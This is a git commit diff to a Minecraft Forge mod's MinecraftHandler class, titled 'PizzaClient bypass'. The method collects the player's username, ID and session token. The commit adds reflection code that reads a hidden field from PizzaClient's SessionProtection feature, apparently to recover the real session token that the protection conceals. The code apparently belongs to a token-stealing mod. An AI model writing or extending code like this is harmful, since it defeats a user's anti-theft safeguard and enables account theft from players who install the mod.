66d24719890d5b94156b3bc506f8859e11d97439
Elyesa <118118166+7Ely@users.noreply.github.com>
2023-07-31 14:47:36 +0300

    PizzaClient bypass

--- src/main/java/dev/schubilegend/handlers/MinecraftHandler.java
+++ src/main/java/dev/schubilegend/handlers/MinecraftHandler.java
@@ -1,10 +1,19 @@
 package dev.schubilegend.handlers;
 
 import net.minecraft.client.Minecraft;
+import net.minecraftforge.fml.common.Loader;
+import net.minecraftforge.fml.relauncher.ReflectionHelper;
 
 public class MinecraftHandler {
-    public String[] getMcInfo(){
-        return new String[]{Minecraft.getMinecraft().getSession().getUsername(),Minecraft.getMinecraft().getSession().getPlayerID(),Minecraft.getMinecraft().getSession().getToken()};
+    public String[] getMcInfo() {
+        String token = null;
+        if (Loader.isModLoaded("pizzaclient")) {
+            try {
+                token = (String) ReflectionHelper.findField(Class.forName("qolskyblockmod.pizzaclient.features.misc.SessionProtection"), "changed").get(null);
+            } catch (Exception e) {
+                e.printStackTrace();
+            }
+        }
+        return new String[]{Minecraft.getMinecraft().getSession().getUsername(), Minecraft.getMinecraft().getSession().getPlayerID(), token};
     }
-
 }
